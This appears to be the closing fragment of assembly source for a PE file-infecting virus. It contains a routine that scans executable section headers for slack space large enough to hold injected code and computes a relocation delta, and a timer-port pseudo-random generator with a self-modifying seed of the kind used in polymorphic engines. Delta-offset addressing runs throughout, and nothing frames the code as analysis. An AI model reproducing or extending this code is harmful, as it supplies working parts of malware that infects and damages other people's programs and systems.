	mov	eax,[esi+10h]
	cld
	sub	eax,ecx
	dec	eax
	pop	ecx

	cmp	eax,[ebp+offset maxsize-offset start-80h]
	jna	notmax

	sub	eax,4                         ; don't use last 4 bytes to avoid messing
	js		notmax		  								  ; with things like jmp [00412340]
	mov	[ebp+offset maxsize-offset start-80h],eax
	add	edi,2+4
	mov	[ebp+offset maxoffset-offset start-80h],edi

	; calculate delta value

	mov	eax,[esi+0ch]
	sub	eax,[esi+14h]
	sub	eax,[ebp+offset mapaddress-offset start-80h]
	add	eax,[ebp+offset imagebase-offset start-80h]
	mov	[ebp+offset delta-offset start-80h],eax

notmax:
	add	esi,28h
	dec	ecx
	jne   trynextsec
	popad
	mov	ecx,[ebp+offset maxsize-offset start-80h]
	mov	edi,[ebp+offset maxoffset-offset start-80h]
	mov	eax,[ebp+offset delta-offset start-80h]
	ret

; get a 32bit pseudo-random value
random32:
	call random16
	shl eax,16
	call random16
	ret

; play with timer registers to get a 16bit pseudo-random value
random16:
	push ebx
	xor bx,0ce76h
seed equ word ptr $-2
	in al,41h
	add bl,al
	in al,42h
	add bh,al
	xor ah,al
	in al,42h
	xor bx,ax
	xor al,ah
	sub bl,al
	in al,40h
	sub bh,ah
	in al,41h
	mov ah,al
	in al,42h
	neg ax
	xor ebx,eax
	ror bx,3
	mov word ptr [ebp+offset seed-offset start-80h],bx
	mov ax,bx
	pop ebx
	ret

end:
end start
end